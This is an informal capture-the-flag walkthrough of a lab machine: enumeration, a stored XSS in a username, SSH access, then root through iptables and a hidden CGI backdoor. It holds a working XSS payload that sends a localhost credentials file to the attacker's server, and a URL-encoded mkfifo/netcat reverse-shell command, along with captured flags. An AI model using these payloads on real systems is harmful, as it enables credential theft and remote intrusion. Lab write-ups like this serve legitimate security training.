------------Enumeration of  machine , ports and services
--> nmap -sC -sV 10.10.180.240 -T4 > nmap.txt
	21 --> FTP --> Anonymous logon allowed
	22 --> SSH
	80 --> HTTP --> A blog found there with a login page


---------Port 21 Enumeration (FTP)
After connecting myself with Anonymous creednnntials, i get a file named update.txt. Look at his content:

Hey I just removed the old user mike because that account was compromised and for any of you who wants the 			creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin

This mesaage tell us that it have the password of one account there, SO we have tro usernames
username1 : admin
Username2 : mike
Password_place: /dir/pass.txt

The problem here is that we don't have access  to this directory directly and i have to connect myself before.

------------Port 80 Enumeration (HTTP)
It in this that i start a directry scanning to see
--> gobuster dir -u http://10.10.180.240/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
	--> /dir --> forbiden
	--> /assets --> just css files 
	--> server_status --> forbiden
So for the dir enum i found nothing. let check something else.

As i see last time blog.php i will try launching a gobuster with php extension

That is what i found 
index.php            (Status: 200) [Size: 563]
/.php                 (Status: 403) [Size: 277]
/login.php            (Status: 200) [Size: 523]
/blog.php             (Status: 200) [Size: 3102]
/register.php         (Status: 200) [Size: 643]
/dir                  (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313]

i create my account and after i logges in. Wheh it was done, i try to put a comment and after delete it i think i can inject sth in the comment area but i don't know what because i inject based xss payload ans it not work.

At the end we noticed that the xss payload might be injected as username.

Payload: <script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://10.2.9.70:8000?q="+t,{mode:"no-cors"}))</script>

Before creating the user with this username, i create a python server on port 8000. When i finishef and wrote my comment see the answer.

python3 -m http.server 8000                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.166.25 - - [09/Dec/2024 04:46:03] "GET /?q=jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -


so we have username and password we will connect ourselves with SSH.

jack@ubuntu:~$ cat user.txt
	1ca4eb201787acbfcf9e70fca87b866a
jack@ubuntu:~$ sudo -l
	[sudo] password for jack: 
	Matching Defaults entries for jack on ubuntu:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
jack@ubuntu:~$ 


So now we will try privilege escalation .

First i try to see all rules set with iptables 
-->sudo iptables -L
	Chain INPUT (policy ACCEPT)
	target     prot opt source               destination         
	DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
	ACCEPT     all  --  anywhere             anywhere            
	ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
	ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
	ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
	ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
	ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
	DROP       all  --  anywhere             anywhere            

	Chain FORWARD (policy ACCEPT)
	target     prot opt source               destination         

	Chain OUTPUT (policy ACCEPT)
	target     prot opt source               destination         
	ACCEPT     all  --  anywhere             anywhere


After that i noticed that port 41312 was blocked or connexion to this port was drop. After that i fulshed all rules with the command 

--> sudo iptable -F
--> nmap -sC -sV 10.10.37.17 -p 41312 -T4 > nmap_after_iptable-F.txt


--> cat nmap_after_iptable-F.txt

As it where opt sourc ewe will try to check in folder /opt.
-->jack@ubuntu:/opt$ ls -la
	total 40
	drwxr-xr-x  2 root root  4096 Aug 16  2023 .
	drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
	-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
	-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
-->jack@ubuntu:/opt$ cat urgent.txt 
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.

I try to acces to the folder /usr/lib/cgi-bin/ but i don't have permission

I will exfiltrate the pcap file on my machine to see.

After searching in the pcap file, i noticed that the web shell was obtained with this :

https://10.10.37.17:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id

so we will use this to put our revere shell.

https://10.10.37.17:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.2.9.70%201234%20%3E%2Ftmp%2Ff


Bingo we gwt the shell and noticed that www-data has all right

ww-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL



After i just do sudo su and go to cat the root.txt

root@ubuntu:~# cat root.txt
cat root.txt
4dbe2259ae53846441cc2479b5475c72
root@ubuntu:~# 




Thank you for reading my opinion of the room @petstar from togo
